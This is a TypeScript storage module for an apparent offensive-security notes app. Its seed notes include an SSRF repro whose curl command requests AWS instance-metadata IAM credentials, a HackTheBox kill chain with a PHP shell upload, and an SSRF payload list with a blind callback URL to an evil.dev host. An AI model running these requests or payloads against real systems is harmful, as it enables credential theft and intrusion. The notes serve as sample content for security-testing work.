"use client";

import type { Note, TagEntry, Block } from "@/types";

const KEY = "tracelog_notes";

function uid(): string {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

const SEED_NOTES: Note[] = [
  {
    id: "ssrf-fetch",
    user_id: "local",
    title: "SSRF via /api/fetch",
    folder: "acme.com / vulns",
    tags: [["vuln", "P1 critical"], ["scope", "acme.com"], ["neutral", "#ssrf"]],
    when: "2d",
    dot: "red",
    excerpt: "Found an open redirect on the login flow — pivoting to test SSRF via the /api/fetch endpoint.",
    content: "Found an open redirect on the login flow — pivoting to test SSRF via the /api/fetch endpoint. The login flow returns an open redirect on the ?next= parameter.",
    body: [
      { type: "p", v: "The login flow returns an open redirect on the `?next=` parameter. Combined with the unauthenticated [[fetch endpoint]] this becomes a chained SSRF reachable from any unauthenticated origin." },
      { type: "h2", v: "repro" },
      { type: "ol", v: ["hit /login?next=https://attacker.dev — server reflects the host without normalizing", "POST /api/fetch with url=http://169.254.169.254/latest/meta-data/", "metadata returned in the JSON body, including IAM creds"] },
      { type: "code", lang: "bash", v: "curl -s -X POST https://acme.com/api/fetch \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'" },
      { type: "callout", tone: "vuln", v: "impact — full read access to EC2 instance role; can read S3 buckets behind it." },
      { type: "h2", v: "links" },
      { type: "links", v: ["fetch endpoint", "SSRF cheatsheet", "AWS IMDSv1 notes", "acme · scope"] },
    ],
    created_at: new Date(Date.now() - 2 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 2 * 86400000).toISOString(),
  } as unknown as Note,
  {
    id: "lazarus-root",
    user_id: "local",
    title: "Lazarus · root flag",
    folder: "hackthebox / writeups",
    tags: [["scope", "HTB"], ["patched", "completed"], ["neutral", "writeup"]],
    dot: "signal",
    excerpt: "Kernel exploit chain working; documenting the priv-esc path for the writeup.",
    content: "Kernel exploit chain working; documenting the priv-esc path for the writeup. Foothold via misconfigured WordPress + leaked database creds.",
    body: [
      { type: "p", v: "Foothold via misconfigured WordPress + leaked database creds. Priv-esc via kernel CVE-2023-2640 once we have a shell as `www-data`." },
      { type: "h2", v: "kill chain" },
      { type: "ol", v: ["enum: wp-scan returns plugin disclosure", "exploit Contact-Form-7 file upload to drop PHP shell", "find DB creds in wp-config — same password reused on SSH", "kernel exploit → root"] },
    ],
    created_at: new Date(Date.now() - 5 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 5 * 86400000).toISOString(),
  } as unknown as Note,
  {
    id: "ssrf-cheats",
    user_id: "local",
    title: "SSRF cheatsheet",
    folder: "vault / refs",
    tags: [["neutral", "ref"], ["neutral", "#ssrf"]],
    dot: "recon",
    excerpt: "Payload bank: gopher, file://, AWS metadata, blind via DNS callbacks, IPv6 ::1 tricks.",
    content: "Payload bank: gopher, file://, AWS metadata, blind via DNS callbacks, IPv6 ::1 tricks.",
    body: [
      { type: "h2", v: "schemes" },
      { type: "ul", v: ["`http://` — most common", "`file://` — local file read", "`gopher://` — raw TCP, useful against Redis/MySQL", "`dict://`, `ldap://`, `sftp://`"] },
      { type: "code", lang: "txt", v: "# blind ssrf via dns callback\nhttp://attacker.${HOST}.collab.evil.dev/" },
    ],
    created_at: new Date(Date.now() - 21 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 21 * 86400000).toISOString(),
  } as unknown as Note,
  {
    id: "recon-acme",
    user_id: "local",
    title: "Recon — acme.com",
    folder: "acme.com / recon",
    tags: [["scope", "acme.com"], ["recon", "passive"]],
    dot: "scope",
    excerpt: "47 live hosts after subfinder + httpx. Interesting: admin-staging, api-v2.",
    content: "47 live hosts after subfinder + httpx. Interesting: admin-staging, api-v2. admin-staging.acme.com (default creds?), api-v2.acme.com (debug header on errors).",
    body: [
      { type: "code", lang: "bash", v: "subfinder -d acme.com -silent \\\n  | httpx -silent -tech-detect -title \\\n  | tee hosts.txt" },
      { type: "p", v: "Sweet spots: admin-staging.acme.com (default creds?), api-v2.acme.com (debug header on errors)." },
    ],
    created_at: new Date(Date.now() - 7 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 7 * 86400000).toISOString(),
  } as unknown as Note,
  {
    id: "ssdlc",
    user_id: "local",
    title: "SSDLC — secure dev lifecycle",
    folder: "vault / notes",
    tags: [["neutral", "concept"]],
    dot: "patched",
    excerpt: "Notes on threat modeling, code review, and the shift-left fallacy.",
    content: "SSDLC is not just 'security review at the end'. The cheapest fix is at the threat-modeling stage; the most expensive is in production.",
    body: [
      { type: "p", v: "SSDLC is not just \"security review at the end\". The cheapest fix is at the threat-modeling stage; the most expensive is in production." },
    ],
    created_at: new Date(Date.now() - 14 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 14 * 86400000).toISOString(),
  } as unknown as Note,
  {
    id: "csrf-101",
    user_id: "local",
    title: "CSRF — Cross-Site Request Forgery",
    folder: "vault / notes",
    tags: [["neutral", "concept"]],
    dot: "recon",
    excerpt: "Same-site cookies, double-submit, custom headers — when each defense actually holds.",
    content: "CSRF only works when the browser auto-attaches credentials and the server doesn't validate origin/intent.",
    body: [
      { type: "p", v: "CSRF only works when the browser auto-attaches credentials and the server doesn't validate origin/intent." },
    ],
    created_at: new Date(Date.now() - 30 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 30 * 86400000).toISOString(),
  } as unknown as Note,
  {
    id: "welcome",
    user_id: "local",
    title: "Bem-vindo ao tracelog",
    folder: "vault",
    tags: [["neutral", "readme"]],
    dot: "neutral",
    excerpt: "tracelog é seu caderno pra notas, snippets e descobertas em offsec.",
    content: "tracelog é seu caderno pra notas, snippets e descobertas em offsec. Comece criando uma pasta pelo escopo.",
    body: [
      { type: "p", v: "Comece criando uma pasta pelo escopo (`empresa.com`) e duas subpastas: `recon` e `vulns`. Use `[[backlink]]` pra conectar achados." },
    ],
    created_at: new Date(Date.now() - 30 * 86400000).toISOString(),
    updated_at: new Date(Date.now() - 30 * 86400000).toISOString(),
  } as unknown as Note,
];

function migrateNote(raw: Record<string, unknown>): Note {
  const tags: TagEntry[] = Array.isArray(raw.tags)
    ? (raw.tags as unknown[]).map((t): TagEntry =>
        Array.isArray(t) && t.length === 2 ? [t[0] as TagEntry[0], String(t[1])] : ["neutral", String(t)]
      )
    : [];
  return {
    id: String(raw.id ?? uid()),
    user_id: String(raw.user_id ?? "local"),
    title: String(raw.title ?? ""),
    content: String(raw.content ?? ""),
    topic: String(raw.topic ?? "Web"),
    tags,
    folder: String(raw.folder ?? "vault"),
    dot: String(raw.dot ?? "neutral"),
    excerpt: String(raw.excerpt ?? String(raw.content ?? "").slice(0, 120)),
    body: Array.isArray(raw.body) ? (raw.body as Block[]) : [],
    canvas_data: (raw.canvas_data as Record<string, unknown> | null) ?? null,
    created_at: String(raw.created_at ?? new Date().toISOString()),
    updated_at: String(raw.updated_at ?? new Date().toISOString()),
  };
}

export function getAllNotes(): Note[] {
  if (typeof window === "undefined") return [];
  try {
    const raw = JSON.parse(localStorage.getItem(KEY) ?? "null") as Record<string, unknown>[] | null;
    if (!raw) {
      saveAll(SEED_NOTES);
      return SEED_NOTES;
    }
    return raw.map(migrateNote);
  } catch {
    return [];
  }
}

function saveAll(notes: Note[]): void {
  localStorage.setItem(KEY, JSON.stringify(notes));
}

export function getNoteById(id: string): Note | null {
  return getAllNotes().find((n) => n.id === id) ?? null;
}

export function createNote(folder = "vault"): Note {
  const now = new Date().toISOString();
  const note: Note = {
    id: uid(),
    user_id: "local",
    title: "",
    content: "",
    topic: "Web",
    tags: [],
    folder,
    dot: "neutral",
    excerpt: "",
    body: [],
    canvas_data: null,
    created_at: now,
    updated_at: now,
  };
  saveAll([note, ...getAllNotes()]);
  return note;
}

export function updateNote(
  id: string,
  updates: Partial<Pick<Note, "title" | "content" | "topic" | "tags" | "folder" | "dot" | "excerpt" | "body" | "canvas_data">>
): Note | null {
  const notes = getAllNotes();
  const idx = notes.findIndex((n) => n.id === id);
  if (idx === -1) return null;
  const updated = { ...notes[idx], ...updates, updated_at: new Date().toISOString() };
  notes[idx] = updated;
  saveAll(notes);
  return updated;
}

export function deleteNote(id: string): void {
  saveAll(getAllNotes().filter((n) => n.id !== id));
}

export function searchNotes(query: string): Note[] {
  const q = query.toLowerCase();
  return getAllNotes().filter(
    (n) =>
      n.title.toLowerCase().includes(q) ||
      n.content.toLowerCase().includes(q) ||
      n.excerpt.toLowerCase().includes(q) ||
      n.tags.some(([, label]) => label.toLowerCase().includes(q))
  );
}
